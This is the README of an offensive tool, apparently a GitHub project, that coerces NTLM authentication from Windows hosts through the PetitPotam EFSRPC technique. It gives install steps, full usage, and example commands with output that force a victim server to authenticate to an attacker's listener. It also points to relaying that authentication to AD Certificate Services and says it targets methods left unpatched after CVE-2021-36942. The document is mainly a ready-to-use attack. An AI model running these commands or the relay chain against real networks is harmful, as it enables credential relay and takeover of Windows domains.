# PetitPotam

Coerce NTLM authentication from Windows hosts

## Installtion

```bash
$ pip3 install impacket
```

## Usage


```bash
usage: petitpotam.py [-h] [-debug] [-port [destination port]] [-pipe pipe]
                     [-method method] [-target-ip ip address]
                     [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-dc-ip ip address]
                     target path

PetitPotam - Coerce authentication from Windows hosts

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  path                  UNC path for authentication

optional arguments:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON

connection:
  -port [destination port]
                        Destination port to connect to MS-RPRN named pipe
  -pipe pipe            Named pipe to use (default: lsarpc)
  -method method        Method used for coercing authentication
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use
                        whatever was specified as target. This is useful when
                        target is the NetBIOS name and you cannot resolve it

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters. If
                        valid credentials cannot be found, it will use the ones
                        specified in the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will
                        use the domain part (FQDN) specified in the target
                        parameter
```

### Examples

In these examples, the victim is `172.16.19.100` and the attacker is `172.16.19.1`

The attack can use `impacket-ntlmrelayx` to relay the authentication to interesting
endpoints, for instance Active Directory Certificate Services Web Enrollment.

By default, a random method will be chosen. 

The target may or may not require authentication. These examples were tested on a 
Windows 2022 server, and no authentication was required.

The UNC path must point to the attacker's listener. Note that if the attacker is not
part of the trusted intranet zone, the Windows host will try to authenticate with a 
null session. This can be circumvented by either using a NETBIOS name or ADIDNS record
for the attacker.

#### Random Method

```bash
$ python3 petitpotam.py -debug '172.16.19.100' '\\172.16.19.1\share\foo'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[+] Connecting to 'ncacn_np:172.16.19.100[\\PIPE\\lsarpc]'
[+] Connected to 'ncacn_np:172.16.19.100[\\PIPE\\lsarpc]'
[+] Binding to ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
[+] Bound to ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
[*] Choosing random method
[*] Using method: AddUsersToFile
[*] Coercing authentication to: '\\\\172.16.19.1\\share\\foo'
[*] Success!
```

#### Specific Method

```bash
$ python3 petitpotam.py -debug -method AddUsersToFile '172.16.19.100' '\\172.16.19.1\share\foo'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[+] Connecting to 'ncacn_np:172.16.19.100[\\PIPE\\lsarpc]'
[+] Connected to 'ncacn_np:172.16.19.100[\\PIPE\\lsarpc]'
[+] Binding to ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
[+] Bound to ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
[*] Using method: AddUsersToFile
[*] Coercing authentication to: '\\\\172.16.19.1\\share\\foo'
[*] Success!
```

## Details

PetitPotam was orignally created / discovered by [topotam](https://github.com/topotam).
This exploit is heavily based on the implementation and research from [topotam](https://github.com/topotam/PetitPotam).

### CVE-2021-36942

Microsoft has released a [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) for PetitPotam, but only for two of the methods (EfsRpcOpenFileRaw, EfsRpcEncryptFileSrv). For that reason, those methods are *not* implemented in this exploit. 

Instead, the other methods (which were not fully implemented by topotam) have been implemented in this exploit.

## Authors
- [@ollypwn](https://github.com/ollypwn)

## Credits
- [@topotam](https://github.com/topotam)'s [implementation](https://github.com/topotam/PetitPotam)
- [Impacket](https://github.com/SecureAuthCorp/impacket)